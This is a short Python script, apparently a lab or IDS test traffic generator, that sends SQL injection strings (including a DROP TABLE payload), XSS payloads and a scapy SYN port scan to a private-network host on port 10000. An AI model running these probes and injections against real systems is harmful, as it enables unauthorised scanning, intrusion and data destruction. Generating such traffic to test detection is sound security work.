import socket
from scapy.all import *

def sqli(strings, HOST):
    PORT = 10000
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    print "connected from sqli"
    print sock.recv(2048)
    for string in strings:
        sock.send(string)
    sock.close()


def portscanner(src_ip, dst_ip):
    for port in xrange(10000, 10014):
            ip = IP(src=src_ip,dst=dst_ip)
            s=TCP(sport=27015, dport=port, flags='S', seq=1000)
            send(ip/s)
    print "done scanning"


def script_xss(dst_ip):
    PORT = 10000
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((dst_ip, PORT))
    print "connected from script_xss"
    print sock.recv(2048)
    string = "<script>alert('xss')</script>"
    sock.send(string)
    sock.close()


def img_xss(dst_ip):
    PORT = 10000
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((dst_ip, PORT))
    print "connected from img_xss"
    print sock.recv(2048)
    strings = ["<img src='alert('XSS')'>",
               "<img src='blah.jpg' onerror='alert('XSS')'>"]
    sock.send(strings[1])
    sock.close()


def main():
    SQL_INJECTION_PATTERNS = ["\' OR \'1\'=\'1",
                              "\' OR \'1\'=\'1\' --",
                              "1;DROP TABLE users"]
    src_ip = "10.0.0.1"
    dst_ip = "10.0.0.10"
    sqli(SQL_INJECTION_PATTERNS, dst_ip)
    portscanner(src_ip, dst_ip)
    # script_xss(dst_ip)
    img_xss(dst_ip)


if __name__ == '__main__':
    main()